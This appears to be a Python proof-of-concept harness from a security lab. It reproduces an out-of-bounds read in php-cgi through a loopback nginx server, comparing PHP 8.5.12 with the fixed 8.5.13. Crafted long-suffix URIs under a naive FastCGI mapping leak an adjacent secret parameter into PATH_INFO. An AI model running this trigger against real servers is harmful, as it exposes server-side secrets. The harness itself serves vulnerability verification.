#!/usr/bin/env python3
"""CVE-2026-129538: HTTP reachability through a real loopback nginx server.

nginx 1.24 (locally extracted .deb, no system install) listens on
127.0.0.1:18081 and forwards every request over FastCGI to a pinned php-cgi
responder on 127.0.0.1:18952. Three nginx param mappings are exercised:

  split        - standard fastcgi_split_path_info + $fastcgi_script_name:
                 SCRIPT_FILENAME=<docroot>/target.php (no suffix),
                 PATH_INFO=/<suffix> -> pilen >= slen, no underflow (control).
  naive        - SCRIPT_FILENAME=$document_root$uri (full URI incl. suffix),
                 PATH_INFO=/ (one byte), ORIG_PATH_INFO=/ so both the OOB
                 read at :1306 and the OOB NUL write at :1294 can fire.
  naive-secret - as naive, plus a SECRET param immediately before PATH_INFO:
                 the OOB read then leaks the SECRET tail into the script's
                 $_SERVER['PATH_INFO'] over plain HTTP.

Observed on 8.5.12: naive PATH_INFO='xxxxx'/'xxxxxxxxx' (n=16/20);
naive-secret PATH_INFO='6789'/'23456789' (SECRET=TOPSECRET0123456789);
8.5.13 leaves PATH_INFO unchanged in every case. No chosen-byte write,
pointer control or code execution is demonstrated: grade stays rung 3,
now with demonstrated HTTP reachability on a real web server. nginx is a
locally extracted .deb under lab/nginx-local/ (no system install).

Usage: python3 lab/repro/php2shell-cve129538-nginx.py [OUTDIR]
"""
import os
import pathlib
import signal
import socket
import subprocess
import sys
import time
import urllib.error
import urllib.request

ROOT = pathlib.Path(__file__).resolve().parents[1]
BUILD = ROOT / 'build'
NGINX = ROOT / 'nginx-local/root/usr/sbin/nginx'
BUILDS = (
    ('8.5.12-asan', BUILD / 'php-8.5.12-asan/sapi/cgi/php-cgi'),
    ('8.5.13-asan', BUILD / 'php-8.5.13-asan/sapi/cgi/php-cgi'),
)
FCGI_PORT = 18952
HTTP_PORT = 18081
TARGET_PHP = ('<?php foreach (["PATH_INFO","ORIG_PATH_INFO","SCRIPT_FILENAME",'
              '"SCRIPT_NAME"] as $k) echo $k,"=",$_SERVER[$k]??"NULL","|";')


def provision_nginx():
    """Extract the distro nginx .deb locally; no system install, no root needed."""
    if NGINX.is_file():
        return
    local = ROOT / 'nginx-local'
    local.mkdir(parents=True, exist_ok=True)
    subprocess.run(['apt-get', 'download', 'nginx', 'nginx-common'],
                   cwd=str(local), check=True)
    for deb in local.glob('*.deb'):
        subprocess.run(['dpkg-deb', '-x', str(deb), str(local / 'root')],
                       check=True)
    if not NGINX.is_file():
        raise RuntimeError('nginx binary missing after local .deb extraction')

NGINX_CONF = """worker_processes 1;
daemon off;
error_log @OUTDIR@/nginx-error.log info;
pid @OUTDIR@/nginx.pid;
events { worker_connections 64; }
http {
    access_log off;
    client_body_temp_path @OUTDIR@/tmp/client_body;
    proxy_temp_path @OUTDIR@/tmp/proxy;
    fastcgi_temp_path @OUTDIR@/tmp/fastcgi;
    uwsgi_temp_path @OUTDIR@/tmp/uwsgi;
    scgi_temp_path @OUTDIR@/tmp/scgi;
    server {
        listen 127.0.0.1:@HTTP_PORT@;
        server_name localhost;
        root @OUTDIR@/docroot;
        location / {
            fastcgi_pass 127.0.0.1:@FCGI_PORT@;
            include @OUTDIR@/@PARAMFILE@;
        }
    }
}
"""

COMMON_PARAMS = """fastcgi_param REQUEST_METHOD $request_method;
fastcgi_param QUERY_STRING $query_string;
fastcgi_param CONTENT_TYPE $content_type;
fastcgi_param CONTENT_LENGTH $content_length;
fastcgi_param SCRIPT_NAME $fastcgi_script_name;
fastcgi_param GATEWAY_INTERFACE CGI/1.1;
fastcgi_param SERVER_SOFTWARE nginx;
fastcgi_param REQUEST_URI $request_uri;
fastcgi_param DOCUMENT_ROOT $document_root;
fastcgi_param SERVER_ADDR $server_addr;
fastcgi_param SERVER_PORT $server_port;
fastcgi_param SERVER_NAME $server_name;
"""

PARAMS = {
    'split': COMMON_PARAMS + """fastcgi_split_path_info ^(.+\\.php)(/.+)$;
fastcgi_param SCRIPT_FILENAME $document_root$fastcgi_script_name;
fastcgi_param PATH_INFO $fastcgi_path_info;
""",
    'naive': COMMON_PARAMS + """fastcgi_param SCRIPT_FILENAME $document_root$uri;
fastcgi_param PATH_INFO /;
fastcgi_param ORIG_PATH_INFO /;
""",
    'naive-secret': COMMON_PARAMS + """fastcgi_param SCRIPT_FILENAME $document_root$uri;
fastcgi_param SECRET TOPSECRET0123456789;
fastcgi_param PATH_INFO /x;
fastcgi_param ORIG_PATH_INFO /;
""",
}


def wait_port(port, timeout=10):
    end = time.time() + timeout
    while time.time() < end:
        try:
            with socket.create_connection(('127.0.0.1', port), timeout=0.2):
                return True
        except OSError:
            time.sleep(0.1)
    return False


def http_get(path, log):
    url = 'http://127.0.0.1:%d%s' % (HTTP_PORT, path)
    try:
        with urllib.request.urlopen(url, timeout=10) as r:
            body = r.read().decode(errors='replace').strip()
            status = r.status
    except urllib.error.HTTPError as e:
        body = e.read().decode(errors='replace').strip()
        status = e.code
    except Exception as e:
        body = 'ERROR %s' % e
        status = -1
    log.write('  GET %-42s -> %d %s\n' % (path, status, body))
    return body


def kill_group(p):
    if p is None:
        return
    try:
        os.killpg(p.pid, signal.SIGTERM)
    except ProcessLookupError:
        pass
    try:
        p.wait(timeout=5)
    except subprocess.TimeoutExpired:
        os.killpg(p.pid, signal.SIGKILL)
        p.wait()


def main():
    provision_nginx()
    out = pathlib.Path(sys.argv[1] if len(sys.argv) > 1 else
                       'lab/build/evidence/w50-nginx').resolve()
    out.mkdir(parents=True, exist_ok=True)
    (out / 'tmp').mkdir(exist_ok=True)
    docroot = out / 'docroot'
    docroot.mkdir(exist_ok=True)
    (docroot / 'target.php').write_text(TARGET_PHP)
    verdict = {}
    try:
        with (out / 'verdict.txt').open('w') as log:
            for mode, params in PARAMS.items():
                pf = out / ('%s.params' % mode)
                pf.write_text(params)
                conf = out / ('nginx-%s.conf' % mode)
                conf.write_text(NGINX_CONF.replace('@OUTDIR@', str(out))
                                .replace('@HTTP_PORT@', str(HTTP_PORT))
                                .replace('@FCGI_PORT@', str(FCGI_PORT))
                                .replace('@PARAMFILE@', pf.name))
                log.write('=== mapping: %s ===\n' % mode)
                for tag, binary in BUILDS:
                    log.write('--- %s: %s ---\n' % (tag, binary))
                    env = dict(os.environ)
                    env['ASAN_OPTIONS'] = 'detect_leaks=0:abort_on_error=1'
                    with (out / ('%s-%s-fcgi.log' % (mode, tag))).open('wb') as flog:
                        gp = subprocess.Popen(
                            [str(binary), '-n', '-b', '127.0.0.1:%d' % FCGI_PORT,
                             '-d', 'cgi.fix_pathinfo=1'],
                            env=env, stdout=flog, stderr=subprocess.STDOUT,
                            start_new_session=True)
                        np = None
                        try:
                            if not wait_port(FCGI_PORT):
                                log.write('  no FastCGI listener\n')
                                continue
                            with (out / ('%s-%s-nginx.log' % (mode, tag))).open('wb') as nlog:
                                np = subprocess.Popen(
                                    [str(NGINX), '-c', str(conf), '-p', str(out)],
                                    stdout=nlog, stderr=subprocess.STDOUT,
                                    start_new_session=True)
                                if not wait_port(HTTP_PORT):
                                    log.write('  no HTTP listener\n')
                                    continue
                                log.write('  short suffix (n=1):\n')
                                http_get('/target.php/x', log)
                                log.write('  long suffix (n=16):\n')
                                verdict[(mode, tag)] = http_get(
                                    '/target.php/' + 'x' * 16, log)
                                log.write('  long suffix (n=20):\n')
                                http_get('/target.php/' + 'x' * 20, log)
                        finally:
                            kill_group(np)
                            kill_group(gp)
                        time.sleep(0.3)
            # Discriminator: with SECRET immediately before PATH_INFO in the
            # FastCGI param block, a long URI suffix makes the affected build
            # read backwards out of PATH_INFO and print the SECRET tail in
            # $_SERVER['PATH_INFO']; the fixed build leaves PATH_INFO intact.
            v12 = verdict.get(('naive-secret', '8.5.12-asan'), '')
            v13 = verdict.get(('naive-secret', '8.5.13-asan'), '')
            leak = ('PATH_INFO=23456789|' in v12 or
                    'PATH_INFO=6789|' in v12)
            clean = 'PATH_INFO=/x|' in v13
            if leak and clean:
                log.write('VERDICT: HTTP-REACHABLE OOB READ CONFIRMED — real nginx '
                          'naive mapping leaks adjacent FastCGI param bytes into '
                          '$_SERVER[PATH_INFO] on 8.5.12; 8.5.13 clean.\n')
            else:
                log.write('VERDICT: HTTP reachability NOT DEMONSTRATED by tested '
                          'configs (inconclusive for other configs).\n')
        print((out / 'verdict.txt').read_text())
    except Exception as exc:
        print('harness error: %r' % exc, file=sys.stderr)
        raise


if __name__ == '__main__':
    main()
